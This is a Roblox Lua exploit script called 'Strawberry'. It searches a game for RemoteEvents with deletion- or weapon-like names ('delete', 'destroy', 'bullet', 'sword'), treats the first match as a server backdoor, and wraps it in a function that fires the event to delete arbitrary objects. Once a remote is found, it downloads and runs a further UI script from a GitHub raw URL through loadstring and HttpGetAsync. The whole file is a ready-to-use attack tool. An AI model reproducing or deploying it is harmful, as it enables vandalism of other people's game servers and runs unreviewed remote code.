--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

local notifchecking = false -- Notifies the player when the script is checking a Parent
local backdoored = false
local event

local players = game:GetService("Players")
local rep = game:GetService("ReplicatedStorage")
local lp = players.LocalPlayer

local likelynames = {
	"delete", "remove", "destroy", "clean", "clear", "bullet", "bala", "shoot", "shot", "fire",
	"segway", "handless", "sword", "attack", "despawn", "deletar", "apagar"
}

local function notification(title, text, duration)
	pcall(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = duration
		})
	end)
end

local function scan(root)
	if notifchecking then
		notification("Strawberry", "Scanning " .. root.Name .. "...", 2)
	end
	for _, v in ipairs(root:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for _, phrase in pairs(likelynames) do
				if v.Name:lower():find(phrase) then
					backdoored = true
					event = v
					notification("Strawberry", "Found a backdoor: " .. v.Name, 2)
					return
				end
			end
		end
	end
end

local function delete(instance)
	if backdoored and event and instance then
		event:FireServer(instance)
	end
end

if not event then
	if notifchecking then notification("Strawberry", "Checking: ReplicatedStorage", 1) end
	scan(rep)
end

if not event then
	if notifchecking then notification("Strawberry", "Checking: Workspace", 1) end
	scan(workspace)
end

if not event then
	if notifchecking then notification("Strawberry", "Checking: LocalPlayer.PlayerGui", 1) end
	scan(lp:WaitForChild("PlayerGui"))
end

if not event then
	if notifchecking then notification("Strawberry", "Checking: Game", 1) end
	scan(game)
end

if not event then
	notification("Strawberry", "Couldn't find a remote, sorry", 2)
end

repeat task.wait(1) until backdoored 

loadstring(
  game:HttpGetAsync("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_v1.lua")
)()
